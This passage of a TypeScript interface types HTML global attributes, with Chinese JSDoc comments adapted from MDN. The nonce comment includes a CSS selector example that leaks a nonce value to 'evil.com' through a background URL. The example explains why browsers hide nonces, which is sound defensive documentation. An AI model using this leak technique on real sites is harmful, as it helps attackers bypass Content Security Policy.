   *   itemid="urn:isbn:0-330-34032-8">
   *   <dt>Title</dt>
   *   <dd itemprop="title">The Reality Dysfunction</dd>
   *   <dt>Author</dt>
   *   <dd itemprop="author">Peter F. Hamilton</dd>
   *   <dt>Publication date</dt>
   *   <dd><time itemprop="pubdate" datetime="1996-01-26">26 January 1996</time></dd>
   * </dl>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/itemid
   */
  itemId?: string
  /**
   * 全局属性`itemprop`被用于向一个物体中添加属性。
   * 每一个 HTML 元素都可以指定一个 itemprop 属性，一个itemprop属性由 name-value 对组成。
   * 每一个键值对称为一个属性，一个元素可以有一个或者多个属性。
   * 属性值可以是一个 string 或者一个 URL，并且可以和大部分元素进行组合，
   * 包括<audio>， <embed>， <iframe>， <img>， <link>， <object>， <source> ， <track>，和 <video>。
   *
   * 示例：
   *
   * 下面的样例展示了一组带有itemprop属性的源代码，后面的表格展示了产生的结构化数据。
   *
   * ```html
   * <div itemscope itemtype="http://schema.org/Movie">
   *   <h1 itemprop="name">Avatar</h1>
   *   <span
   *     >Director:
   *     <span itemprop="director">James Cameron</span>
   *     (born August 16, 1954)</span
   *   >
   *   <span itemprop="genre">Science fiction</span>
   *   <a href="../movies/avatar-theatrical-trailer.html" itemprop="trailer"
   *     >Trailer</a
   *   >
   * </div>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/itemprop
   */
  itemProp?: string
  /**
   * 全局属性 `itemref` 不具有 `itemscope` 属性的元素的后代，才可以与具有 `itemref` 的元素关联。
   * `itemref` 提供了元素 id（并不是 `itemid`）的列表，并具有文档其他地方的额外属性。
   *
   * `itemref` 属性只能在指定了 `itemscope` 的元素上指定。
   *
   * > **注**：`itemref` 属性并不是 microdata 数据模型的一部分。
   * 它仅仅是个语义结构，用于帮助作者向页面添加注解，其中被注解的数据不遵循便利的树结构。
   * 例如，它允许作者标记表格中的数据，以便每一列定义一个单独的条目，同时在表格中保留属性。
   *
   * 示例:
   *
   * ```html
   * <div itemscope id="amanda" itemref="a b"></div>
   * <p id="a">Name: <span itemprop="name">Amanda</span></p>
   * <div id="b" itemprop="band" itemscope itemref="c"></div>
   * <div id="c">
   *   <p>Band: <span itemprop="name">Jazz Band</span></p>
   *   <p>Size: <span itemprop="size">12</span> players</p>
   * </div>
   * ```
   */
  itemRef?: string
  /**
   * `itemscope` 是一个布尔值的全局属性，它定义了一个与元数据关联的数据项。
   *
   * 也就是说一个元素的 `itemscope` 属性会创建一个项，包含了一组与元素相关的键值对。
   * 相关的属性{@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes#itemtype|`itemtype`}通常表示表中一个有效的 URL（比如 schema.org）来表述项目和上下文。
   *
   *
   * 下面每个例子中的概念表都来自 {@link https://schema.org/|schema.org}。
   *
   * 每个 HTML 元素都可以有指定的 `itemscope` 属性。
   * 一个具有 `itemscope` 属性的元素可以没有关联的 `itemtype` ，但必须有相关的 `itemref`。
   *
   * > **备注**：Schema.org 提供了一份共享的词汇表，站长可以使用它来标记网页，而这些标记则被主要的搜索引擎：Google，Microsoft，Yandex 和 Yahoo！所支持。
   *
   * > **备注**：获取更多有关于 `itemtype` 属性的信息： {@link http://schema.org/Thing}
   *
   * 示例：
   *
   * 下面一个例子指定的 `itemscope` 属性，设置了 `itemtype` 为 "{@link http://schema.org/Movie}"，
   * 并且有 3 个关联的 `itemprop` 属性（name、director、genre）。
   *
   * ```html
   * <div itemscope itemtype="http://schema.org/Movie">
   *   <h1 itemprop="name">Avatar</h1>
   *   <span
   *     >Director: <span itemprop="director">James Cameron</span> (born August 16,
   *     1954)</span
   *   >
   *   <span itemprop="genre">Science fiction</span>
   *   <a href="https://youtu.be/0AY1XIkX7bY" itemprop="trailer">Trailer</a>
   * </div>
   * ```
   *
   * @see https://developer.mozill.org/zh-CN/docs/Web/HTML/Global_attributes/itemscope 完整的使用文档
   */
  itemScope?: string
  /**
   * `itemtype`全局属性指定了词汇的 URL，它将会用于定义数据结构中的 {@link `itemScope`}（条目属性）。
   *
   * {@link `itemScope`} 用于设置词汇的生效范围，其中词汇在数据结构中由 `itemtype` 设置。
   *
   * Google 和其他主流搜索引擎支持 {@link https://schema.org/|schema.org} 结构化数据词汇。
   * 这个词汇定义了一组标准的类型名称和属性名称。
   * 例如，{@link https://schema.org/MusicEvent|`MusicEvent`} 表示音乐会的名称，
   * {@link https://schema.org/startDate|`startDate`} 和 {@link https://schema.org/location|`location`}属性指定了音乐会的关键信息。
   * 这里，`MusicEvent` 应该是用于 `itemtype` 的 URL，而 `startDate` 和 `location` 作为 `MusicEvent` 所定义的 `itemprop`。
   *
   * > **备注**：更多 `itemtype` 属性的信息请见 {@link http://schema.org/Thing}
   *
   * - `itemtype` 属性必须拥有这样的值，它是唯一标识的无序集合，这些标识是大小写敏感的，每个标识都是有效的绝对 URL，
   * 并且所有都使用相同词汇定义，属性的值必须至少拥有一个标识。
   * - 条目的类型必须全部为定义在适用规范（例如 schema.org）中的类型，并且必须使用相同词汇定义。
   * - `itemtype` 属性只能在指定了 `itemscope` 属性的元素上指定。
   * - `itemid` 属性只能在同时指定了 `itemscope` 和 `itemtype` 属性的元素上指定。它们必须仅仅在拥有 `itemscope` 属性的元素上指定，它的 `itemtype` 属性指定了不支持全局标识符的词汇，根据该词汇规范的定义。
   * - 全局标识符的准确含义，由词汇的规范决定。它留给这种规范，来定义全局标识符相同的多个条目（位于相同页面或不同页面）是否允许存在，以及对于处理 ID 相同的多个条目，使用什么处理规则。
   *
   * 示例：
   *
   * ```html
   * <div itemscope itemtype="http://schema.org/Product">
   *   <span itemprop="brand">ACME</span>
   *   <span itemprop="name">Executive Anvil</span>
   * </div>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/itemtype 完整的使用文档
   */
  itemType?: string
  /**
   * 全局属性`lang`参与了元素语言的定义。
   * 这个语言是不可编辑元素写入的语言，或者可编辑元素应该写入的语言。
   * 标签包含单个条目，值的格式由 {@link https://www.ietf.org/rfc/bcp/bcp47.txt|用于定义语言的标签 (BCP47)} IETF 文档定义。
   * 如果标签的内容是空字符串，语言就设为未知。如果标签内容是无效的，根据 BCP47，它就设为无效。
   *
   * 即使设置了 `lang` 属性，也可能无效，因为 `xml:lang` 属性更加优先。
   *
   * 对于 CSS 伪类`:lang`，如果它们的名称不同，则两个无效的语言名称是不同的。
   * 比如`:lang(es)`匹配`lang = "es-ES"`和`lang = "es-419"`，而`:lang(xyzzy)`与`lang = "xyzzy-Zorp!"`不匹配。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/lang 完整使用文档
   */
  lang?: string
  /**
   * # 全局属性`nonce`是定义了密码学 nonce（“只使用一次的数字”）的内容属性，{@link https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP|内容安全策略}可以使用它来确定是否允许对给定元素进行获取。
   *
   * `nonce` 属性可用于允许对特定资源的获取，如内联脚本或样式元素。
   * 它可以帮助你避免使用 CSP unsafe-inline 指令，该指令会允许你获取所有的内联脚本或样式资源。
   *
   * > **备注**：只有在无法使用不安全的内联脚本或样式内容时，才使用 `nonce`。
   * 如果不需要 `nonce`，就不要使用。如果脚本是静态的，也可以使用 CSP 哈希值来代替。
   * （请参阅{@link https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src|不安全内联脚本}中的使用说明）。
   * 始终尽量充分利用 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP|CSP} 保护，并尽可能避免使用 nonce 或不安全的内联脚本。
   *
   * ## 使用 nonce 以允许一个 <script> 元素
   * 使用 nonce 机制允许内联脚本需要几个步骤：
   *
   * ### 生成所需值
   *
   * 从你的 web 服务器上，使用一个密码学安全的随机数生成器生成至少 128 位的 base64 编码的随机字符串。每次加载页面时，应该以不同的方式生成 nonce（nonce 只能生成一次！）。例如，在 nodejs 中，应该这样做：
   *
   * ```js
   * const crypto = require("crypto");
   * crypto.randomBytes(16).toString("base64");
   * // '8IBTHwOdqNKAWeKl7plt8g=='
   * ```
   *
   * ### 在内联脚本中允许获取资源
   *
   * 后端代码生成的 nonce 现在应该可用于你希望允许使用的内联脚本：
   *
   * ```html
   * <script nonce="8IBTHwOdqNKAWeKl7plt8g==">
   *   // …
   * </script>
   * ```
   *
   * ### 发送带有 CSP 标头的 nonce
   *
   * 最后，你需要在 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy|Content-Security-Policy} 标头中发送 nonce 值（需要在此值前面附加 nonce-）：
   *
   * ```
   * Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
   * ```
   *
   * ### 访问 nonce 值和 nonce 隐藏
   *
   * 出于安全考虑，nonce 内容属性是隐藏的（将返回空字符串）。
   *
   * ```js
   * script.getAttribute("nonce"); // 返回空字符串
   * ```
   *
   * {@link https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/nonce|`nonce`} 属性是访问 nonce 的唯一方法：
   *
   * ```js
   * script.nonce; // 返回 nonce 值
   * ```
   *
   * Nonce 隐藏有助于防止攻击者通过能从内容属性中抓取数据的机制泄露 nonce 数据，比如这样：
   *
   * ```css
   * script[nonce~="whatever"] {
   *   background: url("https://evil.com/nonce?whatever");
   * }
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/nonce 完整的使用文档
   */
  nonce?: string
  /**
   * # 全局属性`part`包含一个以元素中`part`属性名称组成的列表，该列表以空格分隔。
   * 通过Part的名称，可以使用 CSS 伪元素“::part”来选择 shadow 树中指定元素并设置其样式。
   *
   * 参见用例 {@link https://mdn.github.io/web-components-examples/shadow-part/|Shadow part 实例}.
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/part
   */
  part?: string
  /**
   * popover 全局属性用来指定一个元素为弹出框元素（popover element）。
   *
   * 弹出框元素通过 `display: none` 被隐藏，直到通过调用/控制元素（即带有 `popovertarget` 属性的 `<button>` 或 `<input type="button">`）或 {@link https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/showPopover|HTMLElement.showPopover()} 调用打开。
   *
   * 当打开时，弹出框元素将出现在所有其他元素之上，即在{@link https://developer.mozilla.org/zh-CN/docs/Glossary/Top_layer|顶层}上，并且不会受到父元素的 {@link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position|position} 或 {@link https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow|overflow} 样式的影响。
   *
   * `popover` 属性可以有 {@link https://developer.mozilla.org/en-US/docs/Web/API/Popover_API/Using|"auto"}（默认）或 {@link https://developer.mozilla.org/en-US/docs/Web/API/Popover_API/Using|"manual"} 的取值。
   * 具有 `auto` 状态的弹窗可以通过在弹窗之外的区域进行选择，以达到“轻触关闭”的目的，并且通常一次仅允许屏幕上显示一个弹窗。
   * 相比之下，`manual` 弹窗必须始终明确隐藏，但可以用于菜单中嵌套弹窗等使用情况。
   *
   * 有关更详细的使用信息，请参阅 {@link https://developer.mozilla.org/en-US/docs/Web/API/Popover_API|Popover API} 页面。
   *
   * ## 示例
   *
   * 下述代码将呈现一个按钮，它将打开一个弹出框元素。
   *
   * ```html
   * <button popovertarget="my-popover">打开弹出框</button>
   *
   * <div popover id="my-popover">各位好！</div>
   * ```
   *
   * > **备注**：请参阅我们的弹出框 API 示例页面以访问所有的 MDN 弹出框示例。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/popover
   */
  popover?: 'auto' | 'manual'
  /**
   * 全局属性 `slot` 将一个 {@link https://developer.mozilla.org/zh-CN/docs/Web/API/Web_components/Shadow_DOM|shadow DOM} shadow 树中的槽分配给一个元素：带有 `slot` 属性的元素分配给由 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/slot|<slot>} 创建的槽，它的 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/slot#name|`name`} 属性的值匹配 `slot` 属性的值。
   *
   * 有关示例，请参阅 我们的 {@link https://developer.mozilla.org/en-us/docs/Web/API/Web_components/Using_templates_and_slots|使用模板和插槽}  指南
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/slot 完整的使用文档
   */
  slot?: string
  /**
   * 全局属性`spellcheck`是一个枚举属性，定义是否可以检查元素的拼写错误。
   *
   * > **备注**：此属性仅仅是浏览器的一个提示：浏览器并不会强制去检查拼写错误。通常不检查不可编辑元素的拼写错误，即使 `spellcheck` 属性设置为 `true`，并且浏览器支持拼写检查。
   *
   * 示例：
   * ```html
   * <textarea spellcheck="true">This exampull will be checkd fur spellung when you try to edit it.</textarea>
   *
   * <textarea spellcheck="false">This exampull will nut be checkd fur spellung when you try to edit it.</textarea>
   * ```
   *
   * 它可以具有以下值：
   *
   * - 空字符串或 `true`，指示在可能的情况下检查元素内容的拼写错误;
   * - `false`，指示不应检查元素内容的拼写错误。
   *
   * 如果没有设置这个属性，默认值由元素自身类型和浏览器设置决定。
   * 默认值也可以被继承，当有祖先元素的 `spellcheck` 设置为 `true` 的情况下，子元素的默认值也是 `true`。
   *
   * ## 安全和隐私问题
   *
   * 使用拼写检查可能会对用户的安全性和隐私产生影响。
   * 规范没有规定如何进行拼写检查，元素的内容可能会被发送到第三方进行拼写检查（{@link https://www.otto-js.com/news/article/chrome-and-edge-enhanced-spellcheck-features-expose-pii-even-your-passwords|请参见增强型拼写检查和拼写劫持}）。
   *
   * 对于可能包含敏感信息的元素，你应当考虑将 `spellcheck` 设置为 `false`。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/spellcheck 完整的使用文档
   */
  spellcheck?: BoolType | ''
  /**
   * `tabindex` 全局属性 指示其元素是否可以聚焦，以及它是否/在何处参与顺序键盘导航（通常使用`Tab`键，因此得名）。
   *
   * 示例：
   *
   * ```html
   * <p>Click anywhere in this pane, then try tabbing through the elements.</p>
   *
   * <label>First in tab order:<input type="text" /></label>
   *
   * <div tabindex="0">Tabbable due to tabindex.</div>
   *
   * <div>Not tabbable: no tabindex.</div>
   *
   * <label>Third in tab order:<input type="text" /></label>
   * ```
   *
   * 它接受一个整数作为值，具有不同的结果，具体取决于整数的值：
   *
   *  - tabindex=负值 (通常是 tabindex=“-1”)，表示元素是可聚焦的，但是不能通过键盘导航来访问到该元素，用 JS 做页面小组件内部键盘导航的时候非常有用。
   *  - `tabindex="0"` ，表示元素是可聚焦的，并且可以通过键盘导航来聚焦到该元素，它的相对顺序是当前处于的 DOM 结构来决定的。
   *  - tabindex=正值，表示元素是可聚焦的，并且可以通过键盘导航来访问到该元素；它的相对顺序按照tabindex 的数值递增而滞后获焦。如果多个元素拥有相同的 tabindex，它们的相对顺序按照他们在当前 DOM 中的先后顺序决定。
   *
   * 根据键盘序列导航的顺序，值为 `0` 、非法值、或者没有 tabindex 值的元素应该放置在 tabindex 值为正值的元素后面。
   *
   * 如果我们在 <div> 上设置了 `tabindex` 属性，它的子元素内容不能使用箭头键来滚动，除非我们在内容上也设置 tabindex。
   * {@link https://jsfiddle.net/jainakshay/0b2q4Lgv/|查看这篇 fiddle 来理解 tabindex 的滚动影响}。
   *
   * > **备注**：tabindex 的最大值不应超过 32767。如果没有指定，它的默认值为 0。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/tabindex 完整的使用文档
   */
  tabIndex?: string | number
  /**
   * 全局属性 `title` 包含代表与它所属的元素有关的咨询信息的文本。
   *
   * `title` 属性的主要用途是为辅助技术标注 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe|<iframe>} 元素。
   *
   * `title` 属性也可以用来标注{@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/table|数据表格}中的控件。
   *
   * 当 `title` 属性被添加到 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/link|`<link rel="styleheet">`} 时，将创建一个替代的样式表。当用 `<link rel="alternate">` 定义一个备用样式表时，该属性是必需的，并且必须设置为一个非空字符串。
   *
   * 如果包含在 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/title|`<abbr>`} 起始标签上，`title` 必须是缩写或首字母的完整扩展。尽可能不要使用 `title`，而是在第一次使用时以纯文本提供缩写或缩略语的扩展，使用 `<abbr>` 来标记缩写。这使所有的用户知道这个缩写或简称是什么名字或术语，同时为用户代理提供一个提示，告诉它们如何宣告这个内容。
   *
   * 虽然 `title` 可以用来为 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/input|<input>} 元素提供一个编程关联的标签，但这并不是好的做法。请使用 {@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/label|<label>} 代替。
   *
   * ## 多行标题
   * `title` 属性可以包含多行。每个 `U+000A LINE FEED`（`LF`）符号代表一个换行。有一些需要注意的东西，因为这意味着下面的渲染要跨越两行：
   *
   * ```html
   * <p>
   *   需要考虑 <code>title</code> 中的换行，像
   *   <span
   *     title="这是
   * 多行标题"
   *     >这个示例</span
   *   >。
   * </p>
   * ```
   *
   * ## Title 属性继承
   *
   * 如果一个元素没有 title 属性，那么它就从它的父节点继承，而父节点又可以从它的父节点继承，以此类推。
   *
   * 如果这个属性被设置为空字符串，这意味着它的祖先的 title 是不相关的，不应该被用于这个元素的工具提示（tooltip）中。
   *
   * ```html
   * <div title="CoolTip">
   *   <p>鼠标在这里停留会显示“CoolTip”。</p>
   *   <p title="">鼠标在这里停留不会显示任何东西。</p>
   * </div>
   * ```
   *
   * ## 无障碍考虑
   *
   * 在以下情况下使用 title 属性会引发问题：
   *
   *  - 使用触摸屏设备的人员
   *  - 使用键盘导航的人员
   *  - 使用屏幕阅读器或放大镜等辅助技术导航的人员
   *  - 出现精细运动控制障碍的人员
   *  - 有认知问题的人员
   *
   *  这是由于浏览器的支持不一致，再加上对浏览器渲染的页面进行了额外的辅助技术解析。
   *  如果需要工具提示效果，最好是{@link https://inclusive-components.design/tooltips-toggletips/|使用可以用上述浏览方法访问的更方便的技术}。
   *
   *  - {@link https://html.spec.whatwg.org/multipage/dom.html#the-title-attribute|3.2.5.1. title 属性 | W3C HTML 5.2: 3. HTML 文档的语义、结构和 API}
   *  - {@link https://www.tpgi.com/using-the-html-title-attribute-updated/|使用 HTML title 属性——更新版 | The Paciello Group}
   *  - {@link https://inclusive-components.design/tooltips-toggletips/|Tooltips & Toggletips - Inclusive Components}
   *  - {@link https://www.24a11y.com/2017/the-trials-and-tribulations-of-the-title-attribute/|title 属性的考验与磨难 - 24 Accessibility}
   *
   *  @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/title
   */
  title?: string
  /**
   * 全局属性 `translate` 是一种枚举属性，用来规定对应元素的可翻译属性值及其 {@link https://developer.mozilla.org/zh-CN/docs/Web/API/Text|`Text`} 子节点内容是否跟随系统语言作出对应的翻译变化。
   *
   * 该属性可以有以下值：
   *
   *  - 空字符串或 yes，意味着网页在进行本地化的时候，对应内容要被翻译。
   *  - no，意味着对应的内容无需做任何翻译。
   *
   * 虽然不是所有的浏览器都能识别这个属性，但谷歌翻译等自动翻译系统会遵守这个属性，人类翻译者使用的工具也会遵守这个属性。
   * 因此，web 作者使用这个属性来标记不应该被翻译的内容是很重要的。
   *
   * 示例：
   *
   * 在这个示例中，`translate` 属性令翻译工具不要翻译页脚的公司品牌名称。
   *
   * ```html
   * <footer>
   *   <small>© 2020 <span translate="no">BrandName</span></small>
   * </footer>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/translate
   */
  translate?: 'yes' | 'no'
  /**
   * `virtualkeyboardpolicy` 全局属性是一个枚举属性。当在元素上指定元素内容可编辑时（例如，它是 `<input>` 或 `<textarea>` 元素，或具有 `contenteditable` 属性的元素），它会控制平板电脑、手机或其他可能没有硬件键盘的设备上的屏幕虚拟键盘行为。
   *
   * 该属性必须设置以下值之一：
   *
   *  - `auto` 或空字符串：在元素被聚焦或被点击时会自动显示虚拟键盘。
   *  - `manual`：它会将元素的聚焦和点击与虚拟键盘的状态分离。
   *
   * > 实验性: 这是一项实验性技术，在将其用于生产之前，请仔细检查{@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/virtualkeyboardpolicy#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E6%80%A7|浏览器兼容性表格}。
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/virtualkeyboardpolicy
   */
  virtualkeyboardpolicy?: 'auto' | 'manual'
  /**
   * `writingsuggestions`全局属性是一个枚举属性，指示是否应该在元素上启用浏览器提供的写作建议。
   *
   * 某些浏览器在用户键入可编辑字段时向用户提供写作建议。建议通常显示为位于文本光标后面的灰色文本，以完成用户的句子。
   * 虽然这对用户有帮助，但开发人员可能希望在某些情况下关闭写作建议，例如在提供特定于站点的写作建议时。
   *
   * 可以在可编辑字段（如 `<input>` 或 `<textarea>` 元素）或其他 HTML 元素上设置 `writingsuggestions` 属性，
   * 以控制浏览器对页面各部分或整个页面的建议的行为。
   *
   * ## 语法
   *
   * 在支持它们的浏览器中，默认情况下启用编写建议。要禁用它们，请将 `writingsuggestions` 属性的值设置为 false。
   * 将属性的值设置为 true 或省略该值将启用编写建议。
   *
   * 要禁用写入建议：
   *
   * ```html
   * <input type="text" writingsuggestions="false"></input>
   * ```
   *
   * 要启用编写建议：
   *
   * ```html
   * <input type="text" />
   * <input type="text" writingsuggestions />
   * <input type="text" writingsuggestions="true" />
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/writingsuggestions
   */
  writingsuggestions?: BoolType
  /**
   * 全局属性`exportparts`允许您通过导出嵌套阴影树中的元素名称来选择这些元素并设置其样式。
   *
   * 影子树是一个独立的结构，属于常规 DOM 的选择器或查询无法访问标识符、类和样式。
   *
   * 有两个 HTML 属性可以应用于影子树元素，这些元素允许将 CSS 样式从外部定位到影子树：`part` 和 `exportparts`。
   *
   * `part` 属性使阴影树元素对其父 DOM 可见。
   *
   * 部件名称用作 `::part()` 伪元素的参数。
   *
   * 这样，您可以从阴影树的外部将 CSS 样式应用于阴影树中的元素。
   *
   * 但是，`::part()` 伪元素仅对父 DOM 可见。
   *
   * 这意味着，当阴影树嵌套时，除了直接父级之外，这些部分对任何祖先都不可见。
   *
   * `exportparts` 属性解决了此限制。
   *
   * `exportparts` 属性使阴影树部分在阴影 DOM 之外可见。此概念称为 “导出”。
   *
   * `exportparts` 属性放置在元素的影子主机上，该主机是影子树附加到的元素。
   *
   *  此属性的值是 shadow 树中存在的零件名称的逗号分隔列表。这些名称可供当前结构体之外的 DOM 使用。
   *
   * 示例：
   *
   * ```html
   *  <template id="ancestor-component">
   *   <nested-component exportparts="part1, part2, part5"></nested-component>
   *  </template>
   * ```
   *
   * @see https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/exportparts 具体使用请参考MDN文档
   */
  exportparts?: string
}
